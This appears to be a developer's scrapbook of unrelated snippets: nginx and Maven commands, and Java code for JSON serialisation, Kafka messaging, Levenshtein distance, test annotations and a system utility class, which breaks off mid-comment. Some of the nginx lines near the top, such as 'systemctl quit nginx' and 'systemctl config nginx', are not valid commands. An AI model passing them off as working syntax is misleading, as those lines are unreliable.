--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
#### NGINX
--------------------------------------------------------------------------------------------------------
service nginx stop
systemctl stop nginx

killall -9 nginx

service nginx quit
systemctl quit nginx

service nginx reload
systemctl reload nginx

nginx -t
service nginx configtest
systemctl config nginx

service nginx -V
systemctl -V nginx
--------------------------------------------------------------------------------------------------------
import com.codepoetics.octarine.records.Key;
import com.codepoetics.octarine.records.Record;
import com.codepoetics.octarine.records.Value;
import com.fasterxml.jackson.core.JsonGenerator;
import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.core.Version;
import com.fasterxml.jackson.databind.JsonSerializer;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.SerializerProvider;
import com.fasterxml.jackson.databind.module.SimpleModule;

import java.io.IOException;
import java.util.Collection;
import java.util.Map;
import java.util.stream.Stream;

import static com.codepoetics.octarine.Octarine.$$;

public class ReflectiveRecordSerialiser extends JsonSerializer<Record> {

    private static final ObjectMapper DEFAULT_MAPPER = mapperWith();

    public static ObjectMapper mapperWith(JsonSerializer<?>...extraSerialisers) {
        ObjectMapper mapper = new ObjectMapper();
        SimpleModule simpleModule = new SimpleModule("SimpleModule", Version.unknownVersion());
        simpleModule.addSerializer(new ReflectiveRecordSerialiser());
        simpleModule.addSerializer(new StreamSerialiser());
        Stream.of(extraSerialisers).forEach(simpleModule::addSerializer);

        mapper.registerModules(simpleModule);

        return mapper;
    }

    private static final class StreamSerialiser extends JsonSerializer<Stream> {

        private static final class WrappedIOException extends RuntimeException {

            private final IOException e;

            private WrappedIOException(IOException e) {
                this.e = e;
            }

            public IOException getWrappedException() {
                return e;
            }
        }

        @Override
        public Class<Stream> handledType() { return Stream.class; }

        @Override
        public void serialize(Stream stream, JsonGenerator jsonGenerator, SerializerProvider serializerProvider) throws IOException {
            jsonGenerator.writeStartArray();
            try {
                stream.forEach(item -> {
                    try {
                        serializerProvider.defaultSerializeValue(item, jsonGenerator);
                    } catch (IOException e) {
                        throw new WrappedIOException(e);
                    }
                });
            } catch (WrappedIOException e) {
                throw e.getWrappedException();
            }
            jsonGenerator.writeEndArray();
        }
    }

    public static String toJson(Value...values) throws JsonProcessingException {
        return toJson($$(values));
    }

    public static String toJson(Record record) throws JsonProcessingException {
        return DEFAULT_MAPPER.writeValueAsString(record);
    }

    public static String toJson(Record...records) throws JsonProcessingException {
        return toJson(Stream.of(records));
    }

    public static String toJson(Record record, JsonSerializer<?>...extraSerialisers) throws JsonProcessingException {
        return mapperWith(extraSerialisers).writeValueAsString(record);
    }

    public static String toJson(Collection<Record> records) throws JsonProcessingException {
        return toJson(records.stream());
    }

    public static String toJson(Stream<Record> records) throws JsonProcessingException {
        return DEFAULT_MAPPER.writeValueAsString(records);
    }

    public static String toJson(Collection<Record> records, JsonSerializer<?>...extraSerialisers) throws JsonProcessingException {
        return mapperWith(extraSerialisers).writeValueAsString(records);
    }

    public static String toJson(Stream<Record> records, JsonSerializer<?>...extraSerialisers) throws JsonProcessingException {
        return mapperWith(extraSerialisers).writeValueAsString(records);
    }

    public static String toJson(Map<String, Record> records) throws JsonProcessingException {
        return DEFAULT_MAPPER.writeValueAsString(records);
    }

    public static String toJson(Map<String, Record> records, JsonSerializer<?>...extraSerialisers) throws JsonProcessingException {
        return mapperWith(extraSerialisers).writeValueAsString(records);
    }

    @Override
    public Class<Record> handledType() { return Record.class; }

    @Override
    public void serialize(Record o, JsonGenerator jsonGenerator, SerializerProvider serializerProvider) throws IOException {
        jsonGenerator.writeStartObject();
        for (Map.Entry<Key<?>, Object> entry : o.values().entrySet()) {
            jsonGenerator.writeFieldName(entry.getKey().name());
            serializerProvider.defaultSerializeValue(entry.getValue(), jsonGenerator);
        }
        jsonGenerator.writeEndObject();
    }
}


v
--------------------------------------------------------------------------------------------------------
mvn dependency:tree -Dscope=test
--------------------------------------------------------------------------------------------------------
import java.util.Collection;
import java.util.Comparator;
import java.util.Set;
import java.util.function.Function;
import java.util.stream.Stream;

import static java.util.stream.Collectors.toSet;

public interface JoinKey<S, K> extends Function<S, K>, Comparator<S> {

    static <S, K> JoinKey<S, K> on(Function<? super S, ? extends K> f, Comparator<? super K> comparator) {
        return new JoinKey<S, K>() {
            @Override
            public K apply(S s) {
                return f.apply(s);
            }

            @Override
            public int compare(S o1, S o2) {
                return comparator.compare(apply(o1), apply(o2));
            }

            @Override
            public Index<K, S> index(Stream<? extends S> source) {
                return Index.on(source, f, comparator);
            }
        };
    }

    default Set<K> project(Stream<? extends S> source) {
        return source.map(this).collect(toSet());
    }

    default Index<K, S> index(Collection<? extends S> source) {
        return index(source.stream());
    }

    Index<K, S> index(Stream<? extends S> source);
}
--------------------------------------------------------------------------------------------------------
 *     public static class JodaTimeConverter extends Transformer<LocalDate> {
 *         private static DateTimeFormatter FORMATTER = DateTimeFormat.forStyle("S-");
 *
 *         &#064;Override
 *         public LocalDate transform(String value) {
 *             return FORMATTER.withLocale(getLocale()).parseLocalDate(value);
 *         }
 *     }
--------------------------------------------------------------------------------------------------------
    /**
     * Calculate the average of a list of duration entries
     */
    static class AverageUsageStatisticStrategy implements UsageStatisticStrategy {
        @Override
        public Long calculate(List<Long> durationEntries) {
            if (verifyNoNulls(durationEntries)) {
                return 0L;
            }

            long sum = 0;
            for (Long duration : durationEntries) {
                sum += duration;
            }
            return sum / durationEntries.size();
        }

        private boolean verifyNoNulls(List<Long> durationEntries) {
            return durationEntries == null || durationEntries.isEmpty() || durationEntries.contains(null);
        }
    }

    /**
     * Calculate the median of a list of duration entries
     */
    static class MedianUsageStatisticStrategy implements UsageStatisticStrategy {
        @Override
        public Long calculate(List<Long> durationEntries) {
            if (verifyNoNulls(durationEntries)) {
                return 0L;
            }
            Collections.sort(durationEntries);
            int middle = durationEntries.size() / 2;
            if (durationEntries.size() % 2 == 1) {
                return durationEntries.get(middle);
            } else {
                return (durationEntries.get(middle - 1) + durationEntries.get(middle)) / 2;
            }
        }

        private boolean verifyNoNulls(List<Long> durationEntries) {
            return durationEntries == null || durationEntries.isEmpty() || durationEntries.contains(null);
        }
    }
--------------------------------------------------------------------------------------------------------
import java.lang.annotation.ElementType;
import java.lang.annotation.Retention;
import java.lang.annotation.RetentionPolicy;
import java.lang.annotation.Target;

@Retention(RetentionPolicy.RUNTIME)
@Target(ElementType.METHOD)
public @interface After {
    /**
     * @return a tag expression
     */
    String[] value() default {};

    /**
     * @return max amount of milliseconds this is allowed to run for. 0 (default) means no restriction.
     */
    long timeout() default 0;

    /**
     * The order in which this hook should run. Higher numbers are run first.
     * The default order is 10000.
     */
    int order() default 10000;
}



import java.lang.annotation.ElementType;
import java.lang.annotation.Retention;
import java.lang.annotation.RetentionPolicy;
import java.lang.annotation.Target;

@Retention(RetentionPolicy.RUNTIME)
@Target(ElementType.METHOD)
public @interface Before {
    /**
     * @return a tag expression
     */
    String[] value() default {};

    /**
     * @return max amount of milliseconds this is allowed to run for. 0 (default) means no restriction.
     */
    long timeout() default 0;

    /**
     * The order in which this hook should run. Lower numbers are run first.
     * The default order is 10000.
     */
    int order() default 10000;
}

import java.lang.annotation.ElementType;
import java.lang.annotation.Retention;
import java.lang.annotation.RetentionPolicy;
import java.lang.annotation.Target;

@Retention(RetentionPolicy.RUNTIME)
@Target(ElementType.TYPE)
public @interface StepDefAnnotation {
}


--------------------------------------------------------------------------------------------------------
@Bean
@ConditionalOnProperty(name = "spring.config.location", matchIfMissing = false)
public PropertiesConfiguration propertiesConfiguration(
  @Value("${spring.config.location}") String path) throws Exception {
    String filePath = new File(path.substring("file:".length())).getCanonicalPath();
    PropertiesConfiguration configuration = new PropertiesConfiguration(
      new File(filePath));
    configuration.setReloadingStrategy(new FileChangedReloadingStrategy());
    return configuration;
}

https://www.baeldung.com/spring-reloading-properties
--------------------------------------------------------------------------------------------------------
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.context.ConfigurableApplicationContext;
import org.springframework.context.annotation.Bean;
import org.springframework.kafka.annotation.KafkaListener;
import org.springframework.kafka.annotation.TopicPartition;
import org.springframework.kafka.core.KafkaTemplate;
import org.springframework.kafka.support.KafkaHeaders;
import org.springframework.kafka.support.SendResult;
import org.springframework.messaging.handler.annotation.Header;
import org.springframework.messaging.handler.annotation.Payload;
import org.springframework.util.concurrent.ListenableFuture;
import org.springframework.util.concurrent.ListenableFutureCallback;

@SpringBootApplication
public class KafkaApplication {

    public static void main(String[] args) throws Exception {

        ConfigurableApplicationContext context = SpringApplication.run(KafkaApplication.class, args);
        
        MessageProducer producer = context.getBean(MessageProducer.class);
        MessageListener listener = context.getBean(MessageListener.class);
        /*
         * Sending a Hello World message to topic 'baeldung'. 
         * Must be recieved by both listeners with group foo
         * and bar with containerFactory fooKafkaListenerContainerFactory
         * and barKafkaListenerContainerFactory respectively.
         * It will also be recieved by the listener with
         * headersKafkaListenerContainerFactory as container factory
         */
        producer.sendMessage("Hello, World!");
        listener.latch.await(10, TimeUnit.SECONDS);

        /*
         * Sending message to a topic with 5 partition,
         * each message to a different partition. But as per
         * listener configuration, only the messages from
         * partition 0 and 3 will be consumed.
         */
        for (int i = 0; i < 5; i++) {
            producer.sendMessageToPartion("Hello To Partioned Topic!", i);
        }
        listener.partitionLatch.await(10, TimeUnit.SECONDS);

        /*
         * Sending message to 'filtered' topic. As per listener
         * configuration,  all messages with char sequence
         * 'World' will be discarded.
         */
        producer.sendMessageToFiltered("Hello Baeldung!");
        producer.sendMessageToFiltered("Hello World!");
        listener.filterLatch.await(10, TimeUnit.SECONDS);

        /*
         * Sending message to 'greeting' topic. This will send
         * and recieved a java object with the help of 
         * greetingKafkaListenerContainerFactory.
         */
        producer.sendGreetingMessage(new Greeting("Greetings", "World!"));
        listener.greetingLatch.await(10, TimeUnit.SECONDS);

        context.close();
    }

    @Bean
    public MessageProducer messageProducer() {
        return new MessageProducer();
    }

    @Bean
    public MessageListener messageListener() {
        return new MessageListener();
    }

    public static class MessageProducer {

        @Autowired
        private KafkaTemplate<String, String> kafkaTemplate;

        @Autowired
        private KafkaTemplate<String, Greeting> greetingKafkaTemplate;

        @Value(value = "${message.topic.name}")
        private String topicName;

        @Value(value = "${partitioned.topic.name}")
        private String partionedTopicName;

        @Value(value = "${filtered.topic.name}")
        private String filteredTopicName;

        @Value(value = "${greeting.topic.name}")
        private String greetingTopicName;

        public void sendMessage(String message) {
            
            ListenableFuture<SendResult<String, String>> future = kafkaTemplate.send(topicName, message);
            
            future.addCallback(new ListenableFutureCallback<SendResult<String, String>>() {

                @Override
                public void onSuccess(SendResult<String, String> result) {
                    System.out.println("Sent message=[" + message + "] with offset=[" + result.getRecordMetadata().offset() + "]");
                }
                @Override
                public void onFailure(Throwable ex) {
                    System.out.println("Unable to send message=[" + message + "] due to : " + ex.getMessage());
                }
            });
        }

        public void sendMessageToPartion(String message, int partition) {
            kafkaTemplate.send(partionedTopicName, partition, null, message);
        }

        public void sendMessageToFiltered(String message) {
            kafkaTemplate.send(filteredTopicName, message);
        }

        public void sendGreetingMessage(Greeting greeting) {
            greetingKafkaTemplate.send(greetingTopicName, greeting);
        }
    }

    public static class MessageListener {

        private CountDownLatch latch = new CountDownLatch(3);

        private CountDownLatch partitionLatch = new CountDownLatch(2);

        private CountDownLatch filterLatch = new CountDownLatch(2);

        private CountDownLatch greetingLatch = new CountDownLatch(1);

        @KafkaListener(topics = "${message.topic.name}", groupId = "foo", containerFactory = "fooKafkaListenerContainerFactory")
        public void listenGroupFoo(String message) {
            System.out.println("Received Messasge in group 'foo': " + message);
            latch.countDown();
        }

        @KafkaListener(topics = "${message.topic.name}", groupId = "bar", containerFactory = "barKafkaListenerContainerFactory")
        public void listenGroupBar(String message) {
            System.out.println("Received Messasge in group 'bar': " + message);
            latch.countDown();
        }

        @KafkaListener(topics = "${message.topic.name}", containerFactory = "headersKafkaListenerContainerFactory")
        public void listenWithHeaders(@Payload String message, @Header(KafkaHeaders.RECEIVED_PARTITION_ID) int partition) {
            System.out.println("Received Messasge: " + message + " from partition: " + partition);
            latch.countDown();
        }

        @KafkaListener(topicPartitions = @TopicPartition(topic = "${partitioned.topic.name}", partitions = { "0", "3" }))
        public void listenToParition(@Payload String message, @Header(KafkaHeaders.RECEIVED_PARTITION_ID) int partition) {
            System.out.println("Received Message: " + message + " from partition: " + partition);
            this.partitionLatch.countDown();
        }

        @KafkaListener(topics = "${filtered.topic.name}", containerFactory = "filterKafkaListenerContainerFactory")
        public void listenWithFilter(String message) {
            System.out.println("Recieved Message in filtered listener: " + message);
            this.filterLatch.countDown();
        }

        @KafkaListener(topics = "${greeting.topic.name}", containerFactory = "greetingKafkaListenerContainerFactory")
        public void greetingListener(Greeting greeting) {
            System.out.println("Recieved greeting message: " + greeting);
            this.greetingLatch.countDown();
        }

    }

}
--------------------------------------------------------------------------------------------------------
mvn release:prepare release:perform
--------------------------------------------------------------------------------------------------------

import java.util.LinkedList;
import java.util.List;
import java.util.function.BiFunction;

final class CaseSeparatedReader {

    private static interface StateFunction extends BiFunction<Character, CaseSeparatedReader, State> {
    }

    private static enum State implements StateFunction {
        INITIAL() {
            @Override
            public State apply(Character c, CaseSeparatedReader reader) {
                return Character.isUpperCase(c)
                    ? READING_UPPERCASE : READING_LOWERCASE;
            }
        },

        READING_LOWERCASE() {
            @Override
            public State apply(Character c, CaseSeparatedReader reader) {
                return Character.isUpperCase(c)
                    ? reader.pushName(READING_UPPERCASE) : READING_LOWERCASE;
            }
        },

        READING_ACRONYM() {
            @Override
            public State apply(Character c, CaseSeparatedReader reader) {
                return Character.isUpperCase(c)
                    ? State.READING_ACRONYM : reader.pushAcronym(READING_LOWERCASE);
            }
        },

        READING_UPPERCASE() {
            @Override
            public State apply(Character c, CaseSeparatedReader reader) {
                return Character.isUpperCase(c)
                        ? READING_ACRONYM : READING_LOWERCASE;
            }
        }
    }

    private State state;
    private List<String> parts;
    private StringBuilder currentName;

    private void clearCurrentName() {
        currentName.setLength(0);
    }

    private void addPart(String part) {
        parts.add(part);
    }

    private void addChar(char c) {
        currentName.append(c);
    }

    private State pushName(State newState) {
        addPart(currentName.toString());
        clearCurrentName();
        return newState;
    }

    private State pushAcronym(State newState) {
        addPart(currentName.substring(0, currentName.length() - 1));
        char lastChar = currentName.charAt(currentName.length() - 1);
        clearCurrentName();
        addChar(lastChar);
        return newState;
    }

    private void initialise() {
        state = State.INITIAL;
        parts = new LinkedList<>();
        currentName = new StringBuilder();
    }

    public String[] read(String input) {
        initialise();
        input.chars().forEach(this::readCharacter);
        if (currentName.length() > 0) {
            pushName(null);
        }
        return parts.stream().toArray(String[]::new);
    }

    private void readCharacter(int c) {
        state = state.apply((char) c, this);
        addChar((char) c);
    }
}
--------------------------------------------------------------------------------------------------------
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.lang.reflect.Parameter;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;
import java.util.Objects;
import java.util.concurrent.atomic.AtomicReference;
import java.util.function.Consumer;
import java.util.function.Function;
import java.util.stream.IntStream;

public final class MTuple<T> implements Consumer<T> {

    public static <T> MTuple<T> over(Method method, Object[] args) {
        return new MTuple<>(method, args);
    }
    public static <T> MTuple<T> over(Method method, Map<String, Object> map) {
        Parameter[] parameters = method.getParameters();
        Object[] args = new Object[method.getParameterCount()];
        IntStream.range(0, args.length).forEach(i -> args[i] = map.get(parameters[i].getName()));
        return over(method, args);
    }

    private final Method method;
    private final Object[] args;
    private AtomicReference<Map<String, Object>> asMap = new AtomicReference<>();

    public MTuple(Method method, Object[] args) {
        this.method = method;
        this.args = args;
    }

    @Override
    public void accept(T receiver) {
        try {
            method.invoke(receiver, args);
        } catch (IllegalAccessException e) {
            throw new MethodSendingException(e);
        } catch (InvocationTargetException e) {
            throw new MethodSendingException(e.getCause());
        }
    }

    public <V> V extract(Function<Consumer<V>, T> extractor) {
        AtomicReference<V> ref = new AtomicReference<>();
        accept(extractor.apply(ref::set));
        return ref.get();
    }

    @SuppressWarnings("unchecked")
    public <V> V get(String parameterName) {
        return (V) toMap().get(parameterName);
    }

    public Method getMethod() {
        return method;
    }

    public Object[] getArgs() {
        return args;
    }

    public Map<String, Object> toMap() {
        return asMap.updateAndGet(m -> m != null ? m : createMap());
    }

    private Map<String, Object> createMap() {
        Parameter[] parameters = method.getParameters();
        return IntStream.range(0, method.getParameterCount()).collect(
                HashMap::new,
                (map, i) -> map.put(parameters[i].getName(), args[i]),
                Map::putAll
        );
    }

    @Override
    public boolean equals(Object o) {
        if (this == o) return true;
        if (o == null || getClass() != o.getClass()) return false;
        MTuple<?> mTuple = (MTuple<?>) o;
        return Objects.equals(method, mTuple.method) &&
                Arrays.equals(args, mTuple.args);
    }

    @Override
    public int hashCode() {
        return Objects.hash(method, Arrays.deepHashCode(args));
    }

    @Override
    public String toString() {
        return method.getDeclaringClass().getSimpleName() + "." + method.getName() + toMap().toString();
    }
}
--------------------------------------------------------------------------------------------------------
<!DOCTYPE suite SYSTEM "http://testng.org/testng-1.0.dtd" >

<!-- @BeforeSuite -->
<suite name="TestAll">

	<!-- @BeforeTest -->
	<test name="case1">
	  <classes>
		<class name="com.mkyong.testng.examples.configuration.TestConfiguration" />
		<class name="com.mkyong.testng.examples.configuration.TestDBConnection" />
		<class name="com.mkyong.testng.examples.configuration.DBConfig" />
	  </classes>
	</test>
	<!-- @AfterTest -->
	
	<!-- @BeforeTest -->
	<test name="case2">
	  <classes>
		<class name="com.mkyong.testng.examples.configuration.TestDBConnection" />
		<class name="com.mkyong.testng.examples.configuration.DBConfig" />
	  </classes>
	</test>
	<!-- @AfterTest -->
	
</suite>
<!-- @AfterSuite -->
--------------------------------------------------------------------------------------------------------
https://circuitdigest.com/
pinterest


--------------------------------------------------------------------------------------------------------
public interface Person extends PhantomPojo<Person.Builder> {

    interface Builder extends Supplier<Person> {
        Builder withName(String name);
        Builder withAge(int age);
        Builder withFriends(Builder...friendBuilders);
        Builder withAddress(Address.Builder addressBuilder);
    }

    static Builder builder() {
        return PhantomBuilder.building(Person.class);
    }

    String getName();
    int getAge();
    List<Person> getFriends();
    Address getAddress();
}
--------------------------------------------------------------------------------------------------------
    /**
     * The Levenshtein distance is a string metric for measuring the difference between two sequences.
     * Informally, the Levenshtein distance between two words is the minimum number of single-character edits
     * (i.e. insertions, deletions or substitutions) required to change one word into the other. The phrase
     * 'edit distance' is often used to refer specifically to Levenshtein distance.
     *
     * @param s String one
     * @param t String two
     * @return the 'edit distance' (Levenshtein distance) between the two strings.
     */
    public static int levenshteinDistance(CharSequence s, CharSequence t)
    {
        // degenerate cases          s
        if (s == null || "".equals(s))
        {
            return t == null || "".equals(t) ? 0 : t.length();
        }
        else if (t == null || "".equals(t))
        {
            return s.length();
        }

        // create two work vectors of integer distances
        int[] v0 = new int[t.length() + 1];
        int[] v1 = new int[t.length() + 1];

        // initialize v0 (the previous row of distances)
        // this row is A[0][i]: edit distance for an empty s
        // the distance is just the number of characters to delete from t
        for (int i = 0; i < v0.length; i++)
        {
            v0[i] = i;
        }

        int sLen = s.length();
        int tLen = t.length();
        for (int i = 0; i < sLen; i++)
        {
            // calculate v1 (current row distances) from the previous row v0

            // first element of v1 is A[i+1][0]
            //   edit distance is delete (i+1) chars from s to match empty t
            v1[0] = i + 1;

            // use formula to fill in the rest of the row
            for (int j = 0; j < tLen; j++)
            {
                int cost = (s.charAt(i) == t.charAt(j)) ? 0 : 1;
                v1[j + 1] = (int) MathUtilities.minimum(v1[j] + 1, v0[j + 1] + 1, v0[j] + cost);
            }

            // copy v1 (current row) to v0 (previous row) for next iteration
            System.arraycopy(v1, 0, v0, 0, v0.length);
        }

        return v1[t.length()];
    }

    /**
     * Calculate the Damerau-Levenshtein Distance between two strings.  The basic difference
     * between this algorithm and the general Levenshtein algorithm is that damerau-Levenshtein
     * counts a swap of two characters next to each other as 1 instead of 2.  This breaks the
     * 'triangular equality', which makes it unusable for Metric trees.  See Wikipedia pages on
     * both Levenshtein and Damerau-Levenshtein and then make your decision as to which algorithm
     * is appropriate for your situation.
     *
     * @param source Source input string
     * @param target Target input string
     * @return The number of substitutions it would take
     * to make the source string identical to the target
     * string
     */
    public static int damerauLevenshteinDistance(CharSequence source, CharSequence target)
    {
        if (source == null || "".equals(source))
        {
            return target == null || "".equals(target) ? 0 : target.length();
        }
        else if (target == null || "".equals(target))
        {
            return source.length();
        }

        int srcLen = source.length();
        int targetLen = target.length();
        int[][] distanceMatrix = new int[srcLen + 1][targetLen + 1];

        // We need indexers from 0 to the length of the source string.
        // This sequential set of numbers will be the row "headers"
        // in the matrix.
        for (int srcIndex = 0; srcIndex <= srcLen; srcIndex++)
        {
            distanceMatrix[srcIndex][0] = srcIndex;
        }

        // We need indexers from 0 to the length of the target string.
        // This sequential set of numbers will be the
        // column "headers" in the matrix.
        for (int targetIndex = 0; targetIndex <= targetLen; targetIndex++)
        {
            // Set the value of the first cell in the column
            // equivalent to the current value of the iterator
            distanceMatrix[0][targetIndex] = targetIndex;
        }

        for (int srcIndex = 1; srcIndex <= srcLen; srcIndex++)
        {
            for (int targetIndex = 1; targetIndex <= targetLen; targetIndex++)
            {
                // If the current characters in both strings are equal
                int cost = source.charAt(srcIndex - 1) == target.charAt(targetIndex - 1) ? 0 : 1;

                // Find the current distance by determining the shortest path to a
                // match (hence the 'minimum' calculation on distances).
                distanceMatrix[srcIndex][targetIndex] = (int) MathUtilities.minimum(
                        // Character match between current character in
                        // source string and next character in target
                        distanceMatrix[srcIndex - 1][targetIndex] + 1,
                        // Character match between next character in
                        // source string and current character in target
                        distanceMatrix[srcIndex][targetIndex - 1] + 1,
                        // No match, at current, add cumulative penalty
                        distanceMatrix[srcIndex - 1][targetIndex - 1] + cost);

                // We don't want to do the next series of calculations on
                // the first pass because we would get an index out of bounds
                // exception.
                if (srcIndex == 1 || targetIndex == 1)
                {
                    continue;
                }

                // transposition check (if the current and previous
                // character are switched around (e.g.: t[se]t and t[es]t)...
                if (source.charAt(srcIndex - 1) == target.charAt(targetIndex - 2) && source.charAt(srcIndex - 2) == target.charAt(targetIndex - 1))
                {
                    // What's the minimum cost between the current distance
                    // and a transposition.
                    distanceMatrix[srcIndex][targetIndex] = (int) MathUtilities.minimum(
                            // Current cost
                            distanceMatrix[srcIndex][targetIndex],
                            // Transposition
                            distanceMatrix[srcIndex - 2][targetIndex - 2] + cost);
                }
            }
        }

        return distanceMatrix[srcLen][targetLen];
    }
--------------------------------------------------------------------------------------------------------
mvn -B -e verify -U -Dmaven.javadoc.skip=true -Dmaven.groovydoc.skip=true
--------------------------------------------------------------------------------------------------------
import static java.util.Objects.requireNonNull;

import java.util.function.Function;

import com.typesafe.config.Config;

/**
 * The report data formats.
 *
 * @author ben.manes@gmail.com (Ben Manes)
 */
public enum ReportFormat {
  TABLE(TableReporter::new),
  CSV(CsvReporter::new);

  private final Function<Config, Reporter> factory;

  private ReportFormat(Function<Config, Reporter> factory) {
    this.factory = requireNonNull(factory);
  }

  public Reporter create(Config config) {
    return factory.apply(config);
  }
}

import java.util.List;
import java.util.function.Function;

import com.github.benmanes.caffeine.cache.simulator.parser.address.AddressTraceReader;
import com.github.benmanes.caffeine.cache.simulator.parser.arc.ArcTraceReader;
import com.github.benmanes.caffeine.cache.simulator.parser.cache2k.Cache2kTraceReader;
import com.github.benmanes.caffeine.cache.simulator.parser.lirs.LirsTraceReader;
import com.github.benmanes.caffeine.cache.simulator.parser.scarab.ScarabTraceReader;
import com.github.benmanes.caffeine.cache.simulator.parser.umass.storage.StorageTraceReader;
import com.github.benmanes.caffeine.cache.simulator.parser.wikipedia.WikipediaTraceReader;

/**
 * The trace file formats.
 *
 * @author ben.manes@gmail.com (Ben Manes)
 */
public enum TraceFormat {
  ADDRESS(AddressTraceReader::new),
  ARC(ArcTraceReader::new),
  LIRS(LirsTraceReader::new),
  UMASS_STORAGE(StorageTraceReader::new),
  WIKIPEDIA(WikipediaTraceReader::new),
  CACHE2K(Cache2kTraceReader::new),
  SCARAB(ScarabTraceReader::new);

  private final Function<List<String>, TraceReader> factory;

  private TraceFormat(Function<List<String>, TraceReader> factory) {
    this.factory = factory;
  }

  /**
   * Returns a new reader for streaming the events from the trace file.
   *
   * @param filePaths the path to the files in the trace's format
   * @return a reader for streaming the events from the file
   */
  public TraceReader readFiles(List<String> filePaths) {
    return factory.apply(filePaths);
  }
}

import javax.annotation.Nonnull;
import javax.cache.configuration.Factory;

/**
 * An object capable of providing factories that produce an instance for a given class name.
 *
 * @author ben.manes@gmail.com (Ben Manes)
 */
@FunctionalInterface
public interface FactoryCreator {

  /**
   * Returns a {@link Factory} that will produce instances of the specified class.
   *
   * @param className the fully qualified name of the desired class
   * @param <T> the type of the instances being produced
   * @return a {@link Factory} for the specified class
   */
  @Nonnull
  <T> Factory<T> factoryOf(String className);
}
--------------------------------------------------------------------------------------------------------

import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.lang.management.ManagementFactory;
import java.net.URL;
import java.nio.file.AccessDeniedException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Enumeration;
import java.util.jar.Attributes;
import java.util.jar.Manifest;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

/**
 * Utility-Class with various operating system related helper methods.
 *
 * @author hypfvieh
 * @since v0.0.5 - 2015-08-05
 */
public final class SystemUtil {

    private static final Logger LOGGER = LoggerFactory.getLogger(SystemUtil.class);

    /** List of known terminal emulators on linux/unix systems. */
    private static final String[] TERMINAL_EMULATORS = new String[]
            {"x-terminal-emulator", "gnome-terminal", "mate-terminal",
                    "konsole", "xterm", "rxvt", "xdg-terminal", "lxterminal", "pterm",
                    "aterm", "eterm", "roxterm", "qterminal", "terminator",
                    "tmux", "screen"};

    /** Character that separates components of a file path. This is "/" on UNIX and "\" on Windows. */
    public static final String FILE_SEPARATOR = System.getProperty("file.separator");
    /** Sequence used by operating system to separate lines in text files. */
    public static final String LINE_SEPARATOR = System.getProperty("line.separator");
    /** The system's temporary-file directory. */
    public static final String TMP_DIR        = normalizePath(System.getProperty("java.io.tmpdir"));

    private SystemUtil() {

    }

    /**
     * Determines the operating system's type and version.
     * @return the OS type and version as a string
     */
    public static String getOs() {
        return (System.getProperty("os.name") + " " + System.getProperty("os.version"));
    }


    /**
     * Gets the host name of the local machine.
     * @return host name
     */
    public static String getHostName() {
        try {
            return java.net.InetAddress.getLocalHost().getHostName();
        } catch (java.net.UnknownHostException _ex) {
            return null;
        }
    }

    /**
     * Returns the current working directory.
     * @return current working dir
     */
    public static String getWorkingDirectory() {
        return System.getProperty("user.dir");
    }

    /**
     * Returns the running class path.
     * @return String with classpath
     */
    public static String getRunningClassPath() {
        return ClassLoader.getSystemClassLoader().getResource(".").getPath();
    }

    /**
     * Returns the temp directory of this platform.
     * @return temp directory
     */
    public static String getTempDir() {
        return TMP_DIR;
    }

    /**
     * Determines the Java version of the executing JVM.
     * @return Java version
     */
    public static String getJavaVersion() {
        String[] sysPropParms = new String[] {"java.runtime.version", "java.version"};
        for (int i = 0; i < sysPropParms.length; i++) {
            String val = System.getProperty(sysPropParms[i]);
            if (!StringUtil.isEmpty(val)) {
                return val;
            }
        }
        return null;
    }

    /**
     * Determines the current logged on user.
     * @return logged on user
     */
    public static String getCurrentUser() {
        String[] sysPropParms = new String[] {"user.name", "USER", "USERNAME"};
        for (int i = 0; i < sysPropParms.length; i++) {
            String val = System.getProperty(sysPropParms[i]);
            if (!StringUtil.isEmpty(val)) {
                return val;
            }
        }
        return null;
    }

    /**
     * Concats a path from all given parts, using the path delimiter for the currently used platform.
     * @param _includeTrailingDelimiter include delimiter after last token
     * @param _parts parts to concat
     * @return concatinated string
     */
    public static String concatFilePath(boolean _includeTrailingDelimiter, String..._parts) {
        String concatStrings = StringUtil.concatStrings(false, File.separator, _parts);
        
        if (_includeTrailingDelimiter && concatStrings.length() > 0) {
            return concatStrings + File.separator;
        }

        return concatStrings;
    }
    /**
     * Concats a path from all given parts, using the path delimiter for the currently used platform.
     * Does not include trailing delimiter.
     * @param _parts parts to concat
     * @return concatinated string
     */
    public static String concatFilePath(String... _parts) {
        return concatFilePath(false, _parts);
    }

    /**
     * Append a suffix to the string (e.g. filename) if it doesn't have it already.
     * @param _str string to check
     * @param _suffix suffix to append
     * @return string with suffix or original if no suffix was appended
     */
    public static String appendSuffixIfMissing(String _str, String _suffix) {
        if (_str == null) {
            return null;
        }
        if (!_str.endsWith(_suffix)) {
            _str += _suffix;
        }
        return _str;
    }

    /**
     * Appends the OS specific path delimiter to the end of the String, if it is missing.
     * @param _filePath file path
     * @return String
     */
    public static String appendTrailingDelimiter(String _filePath) {
        if (_filePath == null) {
            return null;
        }
        if (!_filePath.endsWith(File.separator)) {
            _filePath += File.separator;
        }
        return _filePath;
    }

    /**
     * Creates a new temporary directory in the given path.
     * @param _path path
     * @param _name directory name
     * @param _deleteOnExit delete directory on jvm shutdown
     * @return created Directory, null if directory/file was already existing
     */
    public static File createTempDirectory(String _path, String _name, boolean _deleteOnExit) {

        File outputDir = new File(concatFilePath(_path, _name));
        if (!outputDir.exists()) {
            try {
                Files.createDirectory(Paths.get(outputDir.toString()));
            } catch (IOException _ex) {
                LOGGER.error("Error while creating temp directory: ", _ex);
            }
        } else {
            return null;
        }
        if (_deleteOnExit) {
            outputDir.deleteOnExit();
        }
        return outputDir;
    }

    /**
     * Creates a temporary directory in the given path.
     * You can  specify certain files to get a random unique name.
     * @param _path where to place the temp folder
